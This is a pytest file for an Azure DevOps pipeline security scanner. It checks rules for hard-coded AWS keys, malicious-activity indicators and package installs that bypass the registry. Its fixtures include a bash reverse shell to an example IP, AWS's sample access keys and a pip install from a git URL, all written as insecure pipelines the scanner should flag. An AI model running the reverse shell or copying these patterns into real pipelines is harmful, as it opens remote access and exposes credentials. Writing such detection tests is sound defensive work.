"""Per-rule tests for Azure DevOps residual rules:
ADO-014 (long-lived AWS access keys),
ADO-026 (pipeline contains malicious-activity indicators),
ADO-028 (package install bypasses registry integrity).

ADO-014 closes the cross-cloud creds surface that ADO-006 (token
hygiene) doesn't cover (Azure pipelines deploying to AWS via
hard-coded keys instead of OIDC). ADO-026 is the threat-indicator
catch-all. ADO-028 covers the registry-bypass package sources that
ADO-021 (lockfile flag) alone can't catch.
"""
from __future__ import annotations

from .conftest import run_check

# ── ADO-014 long-lived AWS access keys ──────────────────────────────


class TestADO014AWSLongLived:
    def test_fails_when_top_level_var_holds_aws_key_id(self):
        cfg = """
        trigger: none
        variables:
          AWS_ACCESS_KEY_ID: 'AKIAIOSFODNN7EXAMPLE'
          AWS_SECRET_ACCESS_KEY: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'
        jobs:
          - job: deploy
            timeoutInMinutes: 30
            pool: { vmImage: 'ubuntu-22.04' }
            steps:
              - bash: aws s3 cp dist/app.tar.gz s3://prod/
        """
        f = run_check(cfg, "ADO-014")
        assert not f.passed

    def test_fails_when_aws_configure_set_in_script(self):
        cfg = """
        trigger: none
        jobs:
          - job: deploy
            timeoutInMinutes: 30
            pool: { vmImage: 'ubuntu-22.04' }
            steps:
              - bash: |
                  aws configure set aws_access_key_id "$KEY"
                  aws configure set aws_secret_access_key "$SECRET"
                  aws s3 cp dist/app.tar.gz s3://prod/
        """
        f = run_check(cfg, "ADO-014")
        assert not f.passed

    def test_passes_with_no_aws_credentials(self):
        cfg = """
        trigger: none
        jobs:
          - job: build
            timeoutInMinutes: 30
            pool: { vmImage: 'ubuntu-22.04' }
            steps:
              - bash: make
        """
        f = run_check(cfg, "ADO-014")
        assert f.passed


# ── ADO-026 malicious-activity indicators ───────────────────────────


class TestADO026MaliciousActivity:
    def test_fails_on_reverse_shell_pattern(self):
        cfg = """
        trigger: none
        jobs:
          - job: ship
            timeoutInMinutes: 30
            pool: { vmImage: 'ubuntu-22.04' }
            steps:
              - bash: bash -i >& /dev/tcp/198.51.100.7/4444 0>&1
        """
        f = run_check(cfg, "ADO-026")
        assert not f.passed

    def test_passes_on_clean_pipeline(self):
        cfg = """
        trigger: none
        jobs:
          - job: build
            timeoutInMinutes: 30
            pool: { vmImage: 'ubuntu-22.04' }
            steps:
              - bash: make
        """
        f = run_check(cfg, "ADO-026")
        assert f.passed


# ── ADO-028 package source integrity ────────────────────────────────


class TestADO028PackageSourceIntegrity:
    def test_fails_on_pip_install_git_url(self):
        cfg = """
        trigger: none
        jobs:
          - job: build
            timeoutInMinutes: 30
            pool: { vmImage: 'ubuntu-22.04' }
            steps:
              - bash: pip install git+https://github.com/example/tool.git
        """
        f = run_check(cfg, "ADO-028")
        assert not f.passed

    def test_passes_with_lockfile_install(self):
        cfg = """
        trigger: none
        jobs:
          - job: build
            timeoutInMinutes: 30
            pool: { vmImage: 'ubuntu-22.04' }
            steps:
              - bash: pip install --require-hashes -r requirements.txt
        """
        f = run_check(cfg, "ADO-028")
        assert f.passed
